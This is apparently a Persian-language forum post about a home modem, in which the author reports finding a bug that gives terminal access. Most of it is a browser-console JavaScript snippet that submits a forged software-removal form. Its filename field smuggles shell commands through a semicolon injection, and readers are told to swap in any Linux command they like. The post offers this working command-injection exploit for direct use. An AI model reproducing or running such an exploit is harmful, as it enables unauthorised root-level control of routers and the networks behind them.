اقا بعد از چند روز کار روی این مودم متوجه یک باگ شدم که دسترسی ترمینال میده و میتونید به ترمینالش دسترسی پیدا کنید فقط باید این خط کد رو داخل سیستمتون وارد کنید 
به صفحه software مودم برید و کلیک راست بزنید و سپس inspect  را بزنید سپس در قسمت کنسول 
 داخل اسکرین شات نشان دادم کجا باید این کد را وارد کرد 

```
(()=>{
    let cmd=`ls -l /`;
      document.getElementById("submenuOnLeftArea4_5").click();let f=document.createElement("form");f.method="post";f.name="sw_remove";f.id="sw_remove";f.action=NewFormAction("control_panel_sw.asp","remove");let c=document.createElement("input");c.type="hidden";c.name="confirm_code";c.value=document.getElementsByName("confirm_code").value;let d=document.createElement("input");d.type="hidden";d.id="filename";d.name="filename";d.value=`c;cd /mnt/jffs2  ;echo "---------------------" ; ${cmd} ; echo "---------------------" ; exit`;f.appendChild(c);f.appendChild(d);document.body.appendChild(f);f.submit()})();

```
 بعد به راحتی به جای  ls -l /
 کد لینوکسی که میخواهیم را جایگذاری میکنیم و اینتر میزنیم
